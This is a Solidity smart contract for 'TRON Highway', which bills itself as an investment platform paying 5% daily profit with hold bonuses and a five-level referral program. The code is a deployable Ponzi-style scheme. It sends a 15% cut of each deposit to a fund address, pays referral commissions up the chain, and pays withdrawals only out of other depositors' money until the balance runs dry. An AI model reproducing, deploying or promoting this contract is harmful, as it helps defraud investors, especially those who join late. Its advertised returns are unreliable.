//SourceUnit: TronHighway.sol

/*
 *   ┌───────────────────────────────────────────────────────────────────────┐
 *   │   Website: https://www.tronhighway.com                                │
 *   │                                                                       |
 *   |   E-mail: admin@tronhighway.com                                       |
 *   └───────────────────────────────────────────────────────────────────────┘
 *
 * TRON Highway Is The New Tron Invest Platform
 * TRON Highway Plans:
 * Basic daily profit: 5%
 * Hold bonus in 24 hours: 0.2%
 * Contract Balance bonus for every 250,000 trx: 0.2%
 * Referrals program: [5%, 4%, 3%, 2%, 1%]      
 * 
 */

pragma solidity 0.5.14;

contract TronHighway {
    using SafeMath for uint;

    uint constant public DEPOSITS_MAX = 200;
    uint constant public INVEST_MIN_AMOUNT = 200 trx;
    uint constant public BASE_PERCENT = 500;
    uint constant private FUND_FEE = 1500;
    
    uint constant public MAX_CONTRACT_PERCENT = 1500;
    uint constant public MAX_HOLD_PERCENT = 1000;
    uint constant public MAX_DEPOSIT_PERCENT = 1500;
    uint constant public MAX_BALANCE_BONUS_PERCENT = 1000;
    uint constant public PERCENTS_DIVIDER = 10000;
    uint constant public CONTRACT_BALANCE_STEP = 250000 trx;
    uint constant public TIME_STEP = 1 days;
    uint[] public REFERRAL_PERCENTS = [500, 400, 300, 200, 100];

    uint public totalDeposits;
    uint public totalInvested;
    uint public totalWithdrawn;

    uint public contractPercent;

    address payable public fundAddress;

    struct Deposit {
        uint64 amount;
        uint64 withdrawn;
        uint64 refback;
        uint32 start;
    }

    struct User {
        Deposit[] deposits;
        uint32 checkpoint;
        address referrer;
        uint64 bonus;
        uint24[5] refs;
        uint16 rbackPercent;
    }

    mapping (address => User) internal users;

    event Newbie(address user);
    event NewDeposit(address indexed user, uint amount);
    event Withdrawn(address indexed user, uint amount);
    event RefBonus(address indexed referrer, address indexed referral, uint indexed level, uint amount);
    event RefBack(address indexed referrer, address indexed referral, uint amount);
    event FeePayed(address indexed user, uint totalAmount);

    constructor(address payable fundAddr) public {
        require(!isContract(fundAddr));
        fundAddress = fundAddr;
        contractPercent = getContractBalanceRate();
    }

    function invest(address referrer) public payable {
        require(!isContract(msg.sender));

        require(msg.value >= INVEST_MIN_AMOUNT, "Minimum deposit amount 200 TRX");

        User storage user = users[msg.sender];

        require(user.deposits.length < DEPOSITS_MAX, "Maximum 200 deposits from address");

        uint fundFee = msg.value.mul(FUND_FEE).div(PERCENTS_DIVIDER);

        fundAddress.transfer(fundFee);

        if (user.referrer == address(0) && users[referrer].deposits.length > 0 && referrer != msg.sender) {
            user.referrer = referrer;
        }

        uint refbackAmount;
        if (user.referrer != address(0)) {

            address upline = user.referrer;
            for (uint i = 0; i < 5; i++) {
                if (upline != address(0)) {
                    uint amount = msg.value.mul(REFERRAL_PERCENTS[i]).div(PERCENTS_DIVIDER);

                    if (i == 0 && users[upline].rbackPercent > 0) {
                        refbackAmount = amount.mul(uint(users[upline].rbackPercent)).div(PERCENTS_DIVIDER);
                        msg.sender.transfer(refbackAmount);

                        emit RefBack(upline, msg.sender, refbackAmount);

                        amount = amount.sub(refbackAmount);
                    }

                    if (amount > 0) {
                        address(uint160(upline)).transfer(amount);
                        users[upline].bonus = uint64(uint(users[upline].bonus).add(amount));

                        emit RefBonus(upline, msg.sender, i, amount);
                    }

                    users[upline].refs[i]++;
                    upline = users[upline].referrer;
                } else break;
            }

        }

        if (user.deposits.length == 0) {
            user.checkpoint = uint32(block.timestamp);
            emit Newbie(msg.sender);
        }

        user.deposits.push(Deposit(uint64(msg.value), 0, uint64(refbackAmount), uint32(block.timestamp)));

        totalInvested = totalInvested.add(msg.value);
        totalDeposits++;

        if (contractPercent < BASE_PERCENT.add(MAX_CONTRACT_PERCENT)) {
            uint contractPercentNew = getContractBalanceRate();
            if (contractPercentNew > contractPercent) {
                contractPercent = contractPercentNew;
            }
        }

        emit NewDeposit(msg.sender, msg.value);
    }

    function withdraw() public {
        User storage user = users[msg.sender];

        uint userPercentRate = getUserPercentRate(msg.sender);

        uint totalAmount;
        uint dividends;

        for (uint i = 0; i < user.deposits.length; i++) {

            if (uint(user.deposits[i].withdrawn) < uint(user.deposits[i].amount).mul(2)) {

                if (user.deposits[i].start > user.checkpoint) {

                    dividends = (uint(user.deposits[i].amount).mul(userPercentRate).div(PERCENTS_DIVIDER))
                        .mul(block.timestamp.sub(uint(user.deposits[i].start)))
                        .div(TIME_STEP);

                } else {

                    dividends = (uint(user.deposits[i].amount).mul(userPercentRate).div(PERCENTS_DIVIDER))
                        .mul(block.timestamp.sub(uint(user.checkpoint)))
                        .div(TIME_STEP);

                }

                if (uint(user.deposits[i].withdrawn).add(dividends) > uint(user.deposits[i].amount).mul(2)) {
                    dividends = (uint(user.deposits[i].amount).mul(2)).sub(uint(user.deposits[i].withdrawn));
                }

                user.deposits[i].withdrawn = uint64(uint(user.deposits[i].withdrawn).add(dividends)); /// changing of storage data
                totalAmount = totalAmount.add(dividends);

            }
        }

        require(totalAmount > 0, "User has no dividends");

        uint contractBalance = address(this).balance;
        if (contractBalance < totalAmount) {
            totalAmount = contractBalance;
        }

        user.checkpoint = uint32(block.timestamp);

        msg.sender.transfer(totalAmount);

        totalWithdrawn = totalWithdrawn.add(totalAmount);

        contractPercent = getContractBalanceRate();

        emit Withdrawn(msg.sender, totalAmount);
    }

    function setRefback(uint16 rbackPercent) public {
        require(rbackPercent <= 10000);

        User storage user = users[msg.sender];

        if (user.deposits.length > 0) {
            user.rbackPercent = rbackPercent;
        }
    }

    function getContractBalance() public view returns (uint) {
        return address(this).balance;
    }

    function getContractBalanceRate() public view returns (uint) {
        uint contractBalance = address(this).balance;
        uint contractBalancePercent = BASE_PERCENT.add(contractBalance.div(CONTRACT_BALANCE_STEP).mul(20));

        if (contractBalancePercent < MAX_CONTRACT_PERCENT) {
            return contractBalancePercent;
        } else {
            return MAX_CONTRACT_PERCENT;
        }
    }
    
    function getContractBalanceBonusRate() public view returns (uint){
        uint contractBalance = address(this).balance;
        uint contractBalanceBonusRate = contractBalance.div(CONTRACT_BALANCE_STEP).mul(20);

        if (contractBalanceBonusRate < MAX_BALANCE_BONUS_PERCENT) {
            return contractBalanceBonusRate;
        } else {
            return MAX_BALANCE_BONUS_PERCENT;
        }
    }

    function getUserPercentRate(address userAddress) public view returns (uint) {
        User storage user = users[userAddress];

        if (isActive(userAddress)) {

            uint timeMultiplier = (block.timestamp.sub(uint(user.checkpoint))).div(TIME_STEP).mul(20);
            if (timeMultiplier > MAX_HOLD_PERCENT) {
                timeMultiplier = MAX_HOLD_PERCENT;
            }
            if(contractPercent.add(timeMultiplier) > MAX_CONTRACT_PERCENT){
                return MAX_CONTRACT_PERCENT;
            }else{
                return contractPercent.add(timeMultiplier);
            }            
        } else {
            return contractPercent;
        }
    }
    
    function getUserHoldBonusRate(address userAddress) public view returns (uint){
        User storage user = users[userAddress];
        
        if(isActive(userAddress)){
            uint timeMultiplier = (block.timestamp.sub(uint(user.checkpoint))).div(TIME_STEP).mul(20);
            if(timeMultiplier < MAX_HOLD_PERCENT){
                return timeMultiplier;
            }else {
                return MAX_HOLD_PERCENT;
            }
            
        }else {
            return 0;
        }
    }

    function getUserAvailable(address userAddress) public view returns (uint) {
        User storage user = users[userAddress];

        uint userPercentRate = getUserPercentRate(userAddress);

        uint totalDividends;
        uint dividends;

        for (uint i = 0; i < user.deposits.length; i++) {

            if (uint(user.deposits[i].withdrawn) < uint(user.deposits[i].amount).mul(2)) {

                if (user.deposits[i].start > user.checkpoint) {

                    dividends = (uint(user.deposits[i].amount).mul(userPercentRate).div(PERCENTS_DIVIDER))
                        .mul(block.timestamp.sub(uint(user.deposits[i].start)))
                        .div(TIME_STEP);

                } else {

                    dividends = (uint(user.deposits[i].amount).mul(userPercentRate).div(PERCENTS_DIVIDER))
                        .mul(block.timestamp.sub(uint(user.checkpoint)))
                        .div(TIME_STEP);

                }

                if (uint(user.deposits[i].withdrawn).add(dividends) > uint(user.deposits[i].amount).mul(2)) {
                    dividends = (uint(user.deposits[i].amount).mul(2)).sub(uint(user.deposits[i].withdrawn));
                }

                totalDividends = totalDividends.add(dividends);

                /// no update of withdrawn because that is view function

            }

        }

        return totalDividends;
    }

    function isActive(address userAddress) public view returns (bool) {
        User storage user = users[userAddress];

        return (user.deposits.length > 0) && uint(user.deposits[user.deposits.length-1].withdrawn) < uint(user.deposits[user.deposits.length-1].amount).mul(2);
    }

    function getUserAmountOfDeposits(address userAddress) public view returns (uint) {
        return users[userAddress].deposits.length;
    }

    function getUserTotalDeposits(address userAddress) public view returns (uint) {
        User storage user = users[userAddress];

        uint amount;

        for (uint i = 0; i < user.deposits.length; i++) {
            amount = amount.add(uint(user.deposits[i].amount));
        }

        return amount;
    }

    function getUserTotalWithdrawn(address userAddress) public view returns (uint) {
        User storage user = users[userAddress];

        uint amount = user.bonus;

        for (uint i = 0; i < user.deposits.length; i++) {
            amount = amount.add(uint(user.deposits[i].withdrawn)).add(uint(user.deposits[i].refback));
        }

        return amount;
    }

    function getUserDeposits(address userAddress, uint last, uint first) public view returns (uint[] memory, uint[] memory, uint[] memory, uint[] memory) {
        User storage user = users[userAddress];

        uint count = first.sub(last);
        if (count > user.deposits.length) {
            count = user.deposits.length;
        }

        uint[] memory amount = new uint[](count);
        uint[] memory withdrawn = new uint[](count);
        uint[] memory refback = new uint[](count);
        uint[] memory start = new uint[](count);

        uint index = 0;
        for (uint i = first; i > last; i--) {
            amount[index] = uint(user.deposits[i-1].amount);
            withdrawn[index] = uint(user.deposits[i-1].withdrawn);
            refback[index] = uint(user.deposits[i-1].refback);
            start[index] = uint(user.deposits[i-1].start);
            index++;
        }

        return (amount, withdrawn, refback, start);
    }

    function getSiteStats() public view returns (uint, uint, uint, uint) {
        uint contractBalanceBonusRate = getContractBalanceBonusRate();
        
        return (totalInvested, totalDeposits, address(this).balance, contractBalanceBonusRate);
    }

    function getUserStats(address userAddress) public view returns (uint, uint, uint, uint, uint, uint) {
        uint userPerc = getUserPercentRate(userAddress);
        uint userAvailable = getUserAvailable(userAddress);
        uint userDepsTotal = getUserTotalDeposits(userAddress);
        uint userDeposits = getUserAmountOfDeposits(userAddress);
        uint userWithdrawn = getUserTotalWithdrawn(userAddress);
        uint userHoldBonusRate = getUserHoldBonusRate(userAddress);

        return (userPerc, userAvailable, userDepsTotal, userDeposits, userWithdrawn, userHoldBonusRate);
    }

    function getUserReferralsStats(address userAddress) public view returns (address, uint16, uint16, uint64, uint24[5] memory) {
        User storage user = users[userAddress];

        return (user.referrer, user.rbackPercent, users[user.referrer].rbackPercent, user.bonus, user.refs);
    }

    function isContract(address addr) internal view returns (bool) {
        uint size;
        assembly { size := extcodesize(addr) }
        return size > 0;
    }
}

library SafeMath {

    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath: addition overflow");

        return c;
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        require(b <= a, "SafeMath: subtraction overflow");
        uint256 c = a - b;

        return c;
    }

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }

        uint256 c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");

        return c;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        require(b > 0, "SafeMath: division by zero");
        uint256 c = a / b;

        return c;
    }

}